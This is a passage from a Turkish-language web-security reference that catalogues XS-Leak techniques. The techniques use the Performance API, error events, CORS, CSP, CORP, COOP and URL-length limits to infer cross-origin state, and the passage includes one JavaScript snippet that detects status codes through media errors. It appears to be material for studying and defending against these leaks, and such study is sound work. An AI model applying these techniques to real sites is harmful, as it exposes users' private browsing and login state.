[`Performans API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance), web uygulamalarının performans metriklerine dair içgörüler sunar ve bu içgörüler [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API) tarafından daha da zenginleştirilir. Resource Timing API, ağ isteği zamanlamalarının detaylı izlenmesini sağlar, örneğin isteklerin süresini. Sunucular, yanıtlarında `Timing-Allow-Origin: *` başlığını içerdiğinde, transfer boyutu ve alan arama süresi gibi ek veriler erişilebilir hale gelir.

Bu zengin veri, [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) veya [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName) gibi yöntemler aracılığıyla alınabilir, performansla ilgili bilgilerin kapsamlı bir görünümünü sağlar. Ayrıca, API, [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) ile elde edilen zaman damgaları arasındaki farkı hesaplayarak yürütme sürelerinin ölçülmesini kolaylaştırır. Ancak, belirli işlemler için Chrome gibi tarayıcılarda `performance.now()`'un hassasiyeti milisaniyelere sınırlı olabilir, bu da zamanlama ölçümlerinin ayrıntısını etkileyebilir.

Zamanlama ölçümlerinin ötesinde, Performans API, güvenlikle ilgili içgörüler için de kullanılabilir. Örneğin, Chrome'da `performance` nesnesinde sayfaların varlığı veya yokluğu, `X-Frame-Options`'ın uygulanıp uygulanmadığını gösterebilir. Özellikle, bir sayfa `X-Frame-Options` nedeniyle bir çerçevede oluşturulmaktan engellendiğinde, bu sayfa `performance` nesnesinde kaydedilmez, sayfanın çerçeve politikaları hakkında ince bir ipucu sağlar.

### Hata Sızıntısı

* **Dahil Etme Yöntemleri**: Çerçeveler, HTML Elemanları
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Hatalara neden olan bir istek, bir kaynak zamanlama girdisi oluşturmaz.
* **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Bir **hata** oluşturan istekler, bir **performans girdisi oluşturmaz** ve bu nedenle **HTTP yanıt durum kodları arasında fark yapılabilir**.

### Stil Yeniden Yükleme Hatası

* **Dahil Etme Yöntemleri**: HTML Elemanları
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Bir tarayıcı hatası nedeniyle, hatalara neden olan istekler iki kez yüklenir.
* **Kod Örneği**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Önceki teknikte, GC'deki tarayıcı hataları nedeniyle **yüklenemeyen kaynakların iki kez yüklendiği** iki durum belirlendi. Bu, Performans API'da birden fazla giriş oluşturur ve bu nedenle algılanabilir.

### İstek Birleştirme Hatası

* **Dahil Etme Yöntemleri**: HTML Elemanları
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Hatalara neden olan istekler birleştirilemez.
* **Kod Örneği**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Teknik, belirtilen makalede bir tabloda bulundu ancak tekniğin açıklamasına rastlanmadı. Bununla birlikte, bu durumu kontrol eden kaynak kodu [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak) adresinde bulabilirsiniz.

### Boş Sayfa Sızıntısı

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Boş yanıtlar, kaynak zamanlama girdileri oluşturmaz.
* **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Bir saldırgan, bir isteğin boş bir HTTP yanıt gövdesine neden olduğunu tespit edebilir çünkü **boş sayfaların bazı tarayıcılarda performans girdisi oluşturmadığını** görebilir.

### **XSS-Auditor Sızıntısı**

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Güvenlik Bildirimlerinde (SA) XSS Denetleyici kullanılarak, saldırganlar, oluşturulan yüklemelerin denetleyicinin filtreleme mekanizmasını tetiklediğinde yanıtlarda değişiklikler gözlemleyerek belirli web sayfası öğelerini tespit edebilirler.
* **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

Güvenlik Bildirimlerinde (SA), XSS Denetleyici, başlangıçta Cross-Site Scripting (XSS) saldırılarını önlemek için tasarlanmış olmasına rağmen, paradoksal bir şekilde hassas bilgilerin sızdırılmasında kullanılabilir. Bu yerleşik özellik Google Chrome (GC) 'dan kaldırıldı, ancak SA'da hala mevcut. 2013 yılında, Braun ve Heiderich, XSS Denetleyicinin yanlışlıkla meşru betikleri engelleyebileceğini ve yanlış pozitiflere yol açabileceğini gösterdi. Buna dayanarak, araştırmacılar, hassas bilgileri çıkarmak ve çapraz kökenli sayfalarda belirli içeriği tespit etmek için teknikler geliştirdiler, bu kavrama Terada tarafından başlangıçta bildirilen ve Heyes tarafından bir blog yazısında ayrıntılı olarak açıklanan XS-Sızıntıları olarak bilinir. Bu teknikler GC'deki XSS Denetleyicisi için özeldi, ancak SA'da, XSS Denetleyicisi tarafından engellenen sayfaların Performans API'da giriş oluşturmadığı keşfedildi, bu da hassas bilgilerin hala sızdırılabileceği bir yöntemi ortaya koydu.

### X-Frame Sızıntısı

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Özet:** X-Frame-Options başlığına sahip kaynak, kaynak zamanlama girdisi oluşturmaz.
* **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Bir sayfanın bir **iframe** içinde **oluşturulmasına izin verilmediğinde**, bir **performans girdisi oluşturulmaz**. Sonuç olarak, bir saldırgan, yanıt başlığı **`X-Frame-Options`**'ı tespit edebilir.\
Aynı durum **embed** **etiketi kullanıldığında da geçerlidir.**

### İndirme Tespiti

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** İndirmeler, Performans API'da kaynak zamanlama girdisi oluşturmaz.
* **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Tanımlanan XS-Sızıntıya benzer şekilde, bir **kaynak indirildiğinde** ContentDisposition başlığı nedeniyle, ayrıca bir **performans girdisi oluşturmaz**. Bu teknik, tüm büyük tarayıcılarda çalışır.

### Yönlendirme Başlangıç Sızıntısı

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Yönlendirme
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Kaynak zamanlama girişi bir yönlendirme başlangıç zamanını sızdırır.
* **Kod Örneği**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Bazı tarayıcıların davranışlarını istismar eden bir XS-Leak örneği bulduk. Standart, çapraz kaynak istekleri için belirli özniteliklerin sıfıra ayarlanması gerektiğini tanımlar. Ancak, **SA**'da, hedef sayfa tarafından yönlendirilip yönlendirilmediği **Performance API** sorgulanarak ve **redirectStart zamanlama verileri** kontrol edilerek tespit edilebilir.

### Yönlendirme Süresi Sızıntısı

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Yönlendirme
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Bir yönlendirme gerçekleştiğinde zamanlama girişlerinin süresi negatif olur.
* **Kod Örneği**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

GC'de, bir **yönlendirme** ile sonuçlanan isteklerin **süresi negatif** olup olmadığı **ayırt edilebilir**.

### CORP Sızıntısı

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** CORP ile korunan kaynaklar zamanlama girişi oluşturmaz.
* **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Bazı durumlarda, **nextHopProtocol girişi** bir sızıntı tekniği olarak kullanılabilir. GC'de, **CORP başlığı** ayarlandığında, nextHopProtocol **boş** olacaktır. CORP etkin kaynaklar için SA hiçbir performans girişi oluşturmayacaktır.

### Hizmet İşçisi

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: API Kullanımı
* **Daha Fazla Bilgi**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Özet:** Belirli bir kökene kayıtlı bir hizmet işçisinin olup olmadığını tespit edin.
* **Kod Örneği**:

Hizmet işçileri, bir kökende çalışan olaya dayalı betik bağlamlarıdır. Bir web sayfasının arka planında çalışırlar ve kaynakları **ön belleğe almak** için araya girebilir, değiştirebilir ve **ön belleğe alabilirler** ve çevrimdışı web uygulaması oluşturabilirler.\
Bir **hizmet işçisi** tarafından **ön belleğe alınan bir kaynak** **iframe** aracılığıyla erişilirse, kaynak **hizmet işçisi önbelleğinden yüklenecektir**.\
Kaynağın **hizmet işçisi önbelleğinden yüklendiğini** tespit etmek için **Performance API** kullanılabilir.\
Bu ayrıca bir Zamanlama saldırısı ile de yapılabilir (daha fazla bilgi için belgeye bakın).

### Önbellek

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Zamanlama
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Özet:** Bir kaynağın önbelleğe alınıp alınmadığını kontrol etmek mümkündür.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

[Performance API](./#performance-api) kullanılarak bir kaynağın önbelleğe alınıp alınmadığı kontrol edilebilir.

### Ağ Süresi

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Özet:** Bir isteğin ağ süresi `performance` API'den alınabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Hata Mesajları Tekniği

### Medya Hatası

* **Dahil Etme Yöntemleri**: HTML Öğeleri (Video, Ses)
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Özet:** Firefox'ta bir çapraz köken isteğin durum kodunu doğru bir şekilde sızdırmak mümkündür.
* **Kod Örneği**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)

```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```

### CORS Hatası

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Özet:** Güvenlik Beyanlarında (SA), CORS hata mesajları yanlışlıkla yönlendirilen isteklerin tam URL'sini açığa çıkarır.
* **Kod Örneği**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Bu teknik, bir saldırganın Webkit tabanlı tarayıcıların CORS isteklerini nasıl ele aldığını sömürerek **çapraz kaynak sitenin yönlendirme hedefini çıkarmasına** olanak tanır. Özellikle, bir **CORS etkin istek**, kullanıcı durumuna bağlı olarak yönlendirme yapan bir hedef siteye gönderildiğinde ve tarayıcı daha sonra isteği reddettiğinde, hata mesajı içinde **yönlendirmenin tam URL'si** ifşa edilir. Bu zayıflık sadece yönlendirme gerçeğini ortaya çıkarmakla kalmaz, aynı zamanda yönlendirmenin son noktasını ve içerebileceği **duyarlı sorgu parametrelerini** de açığa çıkarır.

### SRI Hatası

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Özet:** Güvenlik Beyanlarında (SA), CORS hata mesajları yanlışlıkla yönlendirilen isteklerin tam URL'sini açığa çıkarır.
* **Kod Örneği**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Bir saldırgan, **aşırı detaylı hata mesajlarını** kullanarak çapraz kaynak yanıtlarının boyutunu çıkarmak için SRI mekanizmasını sömürebilir. Bu, Subresource Integrity (SRI) mekanizmasının, genellikle CDN'lerden alınan kaynakların değiştirilmediğini doğrulamak için bütünlük özniteliğini kullandığı gerçeğinden kaynaklanmaktadır. SRI'nin çapraz kaynak kaynakları üzerinde çalışması için bunların **CORS etkin** olması gerekir; aksi takdirde bütünlük kontrollerine tabi değillerdir. Güvenlik Beyanlarında (SA), CORS hatası XS-Leak gibi, bir bütünlük özniteliğine sahip bir istek başarısız olduğunda bir hata mesajı yakalanabilir. Saldırganlar, herhangi bir isteğin bütünlük özniteliğine **sahte bir kripto değeri atayarak** bu hatayı kasıtlı olarak **tetikleyebilir**. SA'da, ortaya çıkan hata mesajı yanlışlıkla istenen kaynağın içerik uzunluğunu ifşa eder. Bu bilgi sızıntısı, bir saldırganın yanıt boyutundaki değişiklikleri ayırt etmesine olanak tanır, bu da sofistike XS-Leak saldırıları için yol açar.

### CSP İhlali/Tespiti

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Özet:** CSP yalnızca kurbanın web sitesine izin verirse ve erişildiğinde farklı bir etki alanına yönlendirilmeye çalışılırsa CSP, algılanabilir bir hataya neden olacaktır.
* **Kod Örneği**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Bir XS-Leak, CSP'yi kullanarak çapraz kaynak bir sitenin farklı bir kök etki alanına yönlendirilip yönlendirilmediğini tespit edebilir. Bu sızıntı yönlendirmeyi tespit edebilir, ancak ayrıca yönlendirme hedefinin etki alanı da sızar. Bu saldırının temel fikri, **saldırgan sitesindeki hedef etki alanına izin vermek**tir. Bir istek hedef etki alanına gönderildiğinde, bu etki alanı **çapraz kaynak bir etki alana yönlendirilir**. **CSP**, buna erişimi engeller ve bir sızıntı tekniği olarak kullanılan bir **ihlal raporu oluşturur**. Tarayıcıya bağlı olarak, **bu rapor yönlendirmenin hedef konumunu sızdırabilir**.\
Modern tarayıcılar yönlendirildiği URL'yi belirtmeyebilir, ancak hala bir çapraz kaynak yönlendirmesinin tetiklendiğini tespit edebilirsiniz.

### Önbellek

* **Dahil Etme Yöntemleri**: Çerçeveler, Açılır Pencereler
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Özet:** Önbellekten dosyayı temizleyin. Hedef sayfayı açın, dosyanın önbellekte olup olmadığını kontrol edin.
* **Kod Örneği:**

Tarayıcılar tüm web siteleri için ortak bir önbellek kullanabilir. Kökenlerinden bağımsız olarak, bir hedef sayfanın **belirli bir dosyayı isteyip istemediğini** çıkarmak mümkündür.

Bir sayfa yalnızca kullanıcı giriş yaptığında bir resmi yüklüyorsa, **kaynağı geçersiz kılabilirsiniz** (eğer önbellekteyse artık önbellekte değilse, daha fazla bilgi için bağlantılara bakın), bu kaynağı yükleyebilecek bir isteği **gerçekleştirin** ve kaynağı **kötü bir istekle yüklemeye çalışın** (örneğin, aşırı uzun bir başvuru başlığı kullanarak). Kaynak yükleme **herhangi bir hata tetiklemediyse**, bu, kaynağın **önbelleğe alındığı** anlamına gelir.

### CSP Yönergesi

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Özet:** CSP başlık yönergeleri, CSP iframe özniteliğini kullanarak sorgulanabilir ve politika ayrıntıları ortaya çıkarılabilir.
* **Kod Örneği**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Google Chrome'da (GC) yeni bir özellik, bir iframe öğesine bir öznitelik ayarlayarak web sayfalarının **Bir İçerik Güvenlik Politikası (CSP)** önermesine izin verir ve politika yönergeleri HTTP isteği ile iletilir. Genellikle, gömülü içerik bunu **bir HTTP başlığı aracılığıyla yetkilendirmelidir**, aksi takdirde bir **hata sayfası görüntülenir**. Ancak, eğer iframe zaten bir CSP tarafından yönetiliyorsa ve yeni önerilen politika daha kısıtlayıcı değilse, sayfa normal şekilde yüklenecektir. Bu mekanizma, bir saldırganın çapraz kökenli bir sayfanın belirli CSP yönergelerini **belirlemesine olanak tanır**, çünkü hata sayfasını tanımlayabilir. Bu zayıflık düzeltilmiş olarak işaretlendi, ancak bulgularımız, hata sayfasını tespit edebilen **yeni bir sızıntı tekniğini** ortaya koyarak, temel sorunun asla tam olarak ele alınmadığını göstermektedir.

### **CORP**

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Özet:** Cross-Origin Resource Policy (CORP) ile korunan kaynaklar, yasaklanan bir kökenden alındığında bir hata fırlatacaktır.
* **Kod Örneği**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORP başlığı, belirli bir kaynağa **no-cors çapraz köken isteklerini engellediğinde bir hata fırlatacak** olan nispeten yeni bir web platformu güvenlik özelliğidir. Başlığın varlığı algılanabilir, çünkü CORP ile korunan bir kaynağa **erişildiğinde bir hata fırlatır**.

### CORB

* **Dahil Etme Yöntemleri**: HTML Elemanları
* **Algılanabilir Fark**: Başlıklar
* **Daha Fazla Bilgi**: [nosniff başlığının varlığını tespit etme](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Özet**: CORB, saldırganların isteğin içinde **`nosniff` başlığının varlığını tespit etmelerine** olanak tanıyabilir.
* **Kod Örneği**: [CORB Sızıntısı](https://xsinator.com/testing.html#CORB%20Leak) için bağlantıya bakın.

Saldırı hakkında daha fazla bilgi için bağlantıya bakın.

### CORS hatası Origin Yansıma yanlış yapılandırma <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Başlıklar
* **Daha Fazla Bilgi**: [cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Özet**: Eğer Origin başlığı `Access-Control-Allow-Origin` başlığında yansıtılıyorsa, bir kaynağın önbellekte olup olmadığını kontrol etmek mümkündür.
* **Kod Örneği**: [cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Eğer **Origin başlığı**, `Access-Control-Allow-Origin` başlığında **yansıtılıyorsa**, bir saldırgan bu davranışı kötüye kullanarak **CORS** modunda **kaynağı almaya çalışabilir**. Eğer bir **hata oluşmazsa**, bu, kaynağın **web'den doğru şekilde alındığı** anlamına gelir, eğer bir hata **oluşursa**, bu, kaynağın **önbellekten alındığı anlamına gelir** (hata, önbelleğin, orijinal alanı izin veren bir CORS başlığı ile bir yanıtı kaydettiği için ortaya çıkar).\
Unutulmamalıdır ki, eğer origin yansıtılmıyorsa ancak joker karakteri kullanılıyorsa (`Access-Control-Allow-Origin: *`), bu çalışmayacaktır.

## Okunabilir Öznitelik Tekniği

### Fetch Yönlendirme

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [Fetch Yönlendirme Sızıntısı](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Özet:** Yönlendirme tamamlandıktan sonra yanıtın türünü (opaqueredirect) kontrol etmek için GC ve SA kullanılabilir.
* **Kod Örneği**: [Fetch Yönlendirme Sızıntısı](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

`redirect: "manual"` ve diğer parametrelerle Fetch API kullanarak bir istek göndererek, `response.type` özniteliğini okumak mümkündür ve eğer bu `opaqueredirect` ile eşitse, yanıt bir yönlendirmedir.

### COOP

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [COOP Sızıntısı](https://xsinator.com/paper.pdf) (5.4), [Pencere Referanslarına Saldırılar](https://xsleaks.dev/docs/attacks/window-references/)
* **Özet:** Cross-Origin Opener Policy (COOP) tarafından korunan sayfalar, çapraz köken etkileşimlerden erişimi engeller.
* **Kod Örneği**: [COOP Sızıntısı](https://xsinator.com/testing.html#COOP%20Leak)

Bir saldırgan, çapraz kökenli bir HTTP yanıtında Cross-Origin Opener Policy (COOP) başlığının varlığını çıkarabilir. COOP, web uygulamaları tarafından harici sitelerin rastgele pencere referanslarına erişmesini engellemek için kullanılır. Bu başlığın görünürlüğü, **`contentWindow` referansına** erişmeye çalışarak anlaşılabilir. COOP koşullu olarak uygulandığında, **`opener` özelliği** belirleyici bir gösterge haline gelir: COOP etkin olduğunda **tanımsız** olurken, etkin olmadığında **tanımlı** olur.

### URL Maksimum Uzunluğu - Sunucu Tarafı

* **Dahil Etme Yöntemleri**: Fetch API, HTML Elemanları
* **Algılanabilir Fark**: Durum Kodu / İçerik
* **Daha Fazla Bilgi**: [Sunucu Tarafı Yönlendirmeleri](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Özet:** Sunucu tarafından verilen yönlendirme yanıtlarındaki farklılıkları algılamak, yanıtın uzunluğunun çok büyük olması nedeniyle sunucunun bir hata ile yanıt vermesi ve bir uyarı oluşturulması mümkündür.
* **Kod Örneği**: [URL Maksimum Uzunluk Sızıntısı](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Eğer bir sunucu tarafı yönlendirmesi, **yönlendirmede kullanıcı girdisi içeriyorsa** ve **ekstra veri** varsa, bu davranışı tespit etmek mümkündür çünkü genellikle **sunucuların bir istek uzunluk sınırı** vardır. Eğer **kullanıcı verisi** bu **uzunluk - 1** ise, çünkü **yönlendirme** bu veriyi kullanıyor ve **ekstra bir şey ekliyorsa**, bir **hata Error Events aracılığıyla algılanabilir**.

Eğer bir kullanıcıya **çerezler atayabilirseniz**, bu saldırıyı **yeterli sayıda çerez atayarak** da gerçekleştirebilirsiniz ([**çerez bombası**](../hacking-with-cookies/cookie-bomb.md)) böylece **doğru yanıtın boyutu arttığında bir hata** tetiklenir. Bu durumda, bu isteği aynı siteden tetiklerseniz, `<script>` otomatik olarak çerezleri gönderir (bu nedenle hataları kontrol edebilirsiniz).\
**Çerez bombası + XS-Search** örneği, bu yazının amaçlanan çözümünde bulunabilir: [amaçlanan](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

Bu tür bir saldırı için genellikle **SameSite=None** veya aynı bağlamda olmak gereklidir.

### URL Maksimum Uzunluğu - İstemci Tarafı

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Durum Kodu / İçerik
* **Daha Fazla Bilgi**: [Chrom'un 2MB URL sınırı](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Özet:** Yanıtın uzunluğundaki farklılıkları algılamak, bir isteğin çok büyük bir yönlendirme yanıtı için uzun olması nedeniyle fark edilebilecek bir fark olabilir.
* **Kod Örneği**: [Chrom'un 2MB URL sınırı](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

[Chromium belgelerine](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length) göre, Chrome'un maksimum URL uzunluğu 2MB'dir.

> Genel olarak, _web platformu_ URL'lerin uzunluğuna sınırlama getirmez (ancak 2^31 yaygın bir sınırdır). _Chrome_, uygulama nedenleri ve ara işlem iletişiminde hizmet reddi sorunlarına neden olmamak için URL'leri **2MB**'ye kadar sınırlar.

Bu nedenle, **yönlendirme URL'si** bir durumda daha büyükse, bu, **2MB'den büyük bir URL ile yönlendirme yapılabilir** ve **uzunluk sınırına ulaşılabilir**. Bu durumda, Chrome, bir **`about:blank#blocked`** sayfası gösterir.

**Fark edilebilir fark**, eğer **yönlendirme** tamamlandıysa, `window.origin` bir **hata fırlatır** çünkü çapraz köken bu bilgiye erişemez. Ancak, **limit** aşıldığında ve yüklenen sayfa **`about:blank#blocked`** ise pencerenin **`origin`**'i **ana sayfanın**ki gibi kalır, bu da **erişilebilir bir bilgidir**.

**2MB'ye** ulaşmak için gereken tüm ek bilgiler, başlangıçtaki URL'de bir **hash** ile eklenerek yönlendirmede **kullanılabilir** hale getirilebilir.

{% content-ref url="url-max-length-client-side.md" %}
[url-max-length-client-side.md](url-max-length-client-side.md)
{% endcontent-ref %}

### Maksimum Yönlendirmeler

* **Dahil Etme Yöntemleri**: Fetch API, Frames
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
